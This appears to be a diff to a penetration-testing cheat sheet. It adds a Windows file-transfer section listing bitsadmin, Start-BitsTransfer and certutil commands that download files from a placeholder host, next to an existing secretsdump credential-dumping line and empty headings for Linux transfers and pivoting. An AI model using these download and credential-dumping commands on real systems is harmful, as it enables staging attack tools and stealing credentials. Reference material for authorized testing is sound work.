@@ -363,9 +363,28 @@ secretsdump.py <domain>/<user>:<password>@<IP>
   ```
   ## ZeroLogon
 
+## File Transfers
+### Windows File Transfers
+#### LOLBAS
+##### Bitsadmin
+```powershell
+bitsadmin /transfer wcb /priority foreground http://<host>/<file> C:\Users\<User>\Desktop\<file>
+```
+```powershell
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://<host>/<file>" -Destination "C:\Users\<User>\Desktop\<file>"
+``
+##### Certutil
+```cmd
+certutil.exe -verifyctl -split -f http://<host>/<file>
+```
 
-## Post Exploitation
-### File Transfers
+### Linux File Transfers
+### GTFOBINS
+### Transferring Files with Code
+### Protected File Transfers
+### Catching Files over HTTP/S
+
+### Pivoting
 ### 
 
 ## Testing the Top 10 Web Application Vulnerabilities
